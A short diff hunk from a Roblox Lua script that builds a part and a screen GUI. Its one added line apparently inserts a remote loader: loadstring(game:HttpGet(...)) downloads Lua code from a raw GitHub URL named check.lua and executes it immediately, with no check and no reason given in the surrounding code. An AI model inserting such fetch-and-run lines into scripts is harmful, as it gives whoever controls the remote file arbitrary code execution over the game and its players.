@@ -4,6 +4,7 @@ end
 local detal = Instance.new("Part",workspace)
 local cheka = 2
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/slavabeez/script/refs/heads/main/check.lua"))()
 
 wait(0.5)
 local ba=Instance.new("ScreenGui")
